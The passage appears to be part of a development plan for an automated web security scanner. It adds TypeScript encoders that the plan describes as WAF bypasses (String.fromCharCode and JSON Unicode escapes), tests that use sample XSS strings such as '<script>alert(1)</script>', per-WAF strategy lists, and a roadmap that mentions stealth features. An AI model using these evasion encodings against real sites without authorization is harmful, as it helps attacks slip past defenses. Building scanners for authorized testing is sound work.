  it('encodes angle brackets as JSON unicode escapes', () => {
    const result = jsonUnicodeEncode('<script>alert(1)</script>');
    expect(result).toContain('\\u003c');
    expect(result).toContain('\\u003e');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('encodes quotes', () => {
    const result = jsonUnicodeEncode('"hello"');
    expect(result).toContain('\\u0022');
  });
});

describe('mutatePayload with new strategies', () => {
  it('includes fromCharCode variant', () => {
    const strategies: EncodingStrategy[] = ['none', 'from-char-code'];
    const results = mutatePayload('alert(1)', strategies);
    expect(results.length).toBe(2);
    expect(results.some((r) => r.includes('String.fromCharCode'))).toBe(true);
  });

  it('includes json-unicode variant', () => {
    const strategies: EncodingStrategy[] = ['none', 'json-unicode'];
    const results = mutatePayload('<img src=x>', strategies);
    expect(results.some((r) => r.includes('\\u003c'))).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run test/unit/payload-mutator-v2.test.ts`
Expected: FAIL — exports not found

- [ ] **Step 3: Add new encoding strategies**

In `src/utils/payload-mutator.ts`:

```typescript
// Update type:
export type EncodingStrategy = 'none' | 'url' | 'double-url' | 'html-entity' | 'unicode' | 'mixed' | 'from-char-code' | 'json-unicode';

// Add new encoding functions:

/** Convert to String.fromCharCode() — bypasses string-matching WAFs */
export function fromCharCodeEncode(input: string): string {
  const codes = [...input].map((ch) => ch.charCodeAt(0));
  return `String.fromCharCode(${codes.join(',')})`;
}

/** JSON Unicode escape — bypasses WAFs that don't decode JSON unicode */
export function jsonUnicodeEncode(input: string): string {
  return input
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/"/g, '\\u0022')
    .replace(/'/g, '\\u0027')
    .replace(/&/g, '\\u0026')
    .replace(/\//g, '\\u002f');
}

// Update applyEncoding switch:
case 'from-char-code':
  return fromCharCodeEncode(payload);
case 'json-unicode':
  return jsonUnicodeEncode(payload);
```

Update `pickStrategies` to include new strategies for specific WAFs:
```typescript
case 'cloudflare':
  strategies.push('unicode', 'mixed', 'from-char-code');
  break;
case 'aws waf':
case 'unknown waf':
  strategies.push('html-entity', 'unicode', 'mixed', 'json-unicode');
  break;
```

- [ ] **Step 4: Run all tests**

Run: `npx vitest run test/unit/payload-mutator-v2.test.ts`
Expected: PASS

Run: `npx vitest run`
Expected: All tests pass

- [ ] **Step 5: Commit**

```bash
git add src/utils/payload-mutator.ts test/unit/payload-mutator-v2.test.ts
git commit -m "feat(payloads): String.fromCharCode + JSON Unicode encoding strategies for WAF bypass"
```

---

## Chunk 5: Wire Subdomain Results into Pipeline + Update Docs

### Task 7: Thread Subdomain Results into ScanConfig

**Files:**
- Modify: `src/index.ts`

- [ ] **Step 1: Pass subdomain results into config**

In `src/index.ts`, after the subdomain enumeration phase (Phase 2), wire results into config:

```typescript
// After subdomain enumeration completes:
if (subdomainResults.length > 0) {
  config.subdomainResults = subdomainResults;
}
```

This allows the subdomain-takeover check to access results via `config.subdomainResults`.

- [ ] **Step 2: Run full test suite**

Run: `npx vitest run`
Expected: All tests pass

- [ ] **Step 3: Commit**

```bash
git add src/index.ts
git commit -m "feat: wire subdomain enumeration results into ScanConfig for takeover check"
```

---

### Task 8: Update CLAUDE.md and Version

**Files:**
- Modify: `CLAUDE.md`
- Modify: `package.json`

- [ ] **Step 1: Bump version to v0.14.0**

In `package.json`: `"version": "0.14.0"`

- [ ] **Step 2: Update CLAUDE.md**

Add to Status section:
```
- v0.14 detection depth: subdomain takeover (14 service fingerprints), IDOR query param + horizontal enum, mutation XSS (8 payloads), CSP bypass (6 payloads), 2 new encoding strategies
```

Update check count: `25 active check types` (added subdomain-takeover)

Update CheckCategory section with `subdomain-takeover`

Add to Key Files:
```
subdomain-takeover.ts         # Subdomain takeover (dangling CNAME → 14 service fingerprints)
subdomain-takeover-fingerprints.ts  # Service fingerprint database
```

- [ ] **Step 3: Commit**

```bash
git add CLAUDE.md package.json
git commit -m "chore: bump to v0.14.0, update docs with detection depth improvements"
```

---

## Summary

**What this plan produces:**
- 1 new active check (subdomain takeover — 14 service fingerprints)
- IDOR depth: query parameter + UUID detection, horizontal enumeration (±1 probing)
- 14 new XSS payloads (8 mutation XSS + 6 CSP bypass)
- 2 new encoding strategies (String.fromCharCode, JSON Unicode)
- ~30+ new tests

**Estimated test count after completion:** ~1520+

**What comes next (separate plans):**
- **Phase 3:** False positive elimination (confidence scoring, auto-verify, two-pass validation)
- **Phase 4:** Stealth & self-defense (behavioral stealth, adaptive encoding, hardening)
- **Phase 5:** Autonomous hunting + self-learning (registry, cron, queue, Nara, outcome tracking)

Each subsequent phase gets its own plan document after this phase is validated.
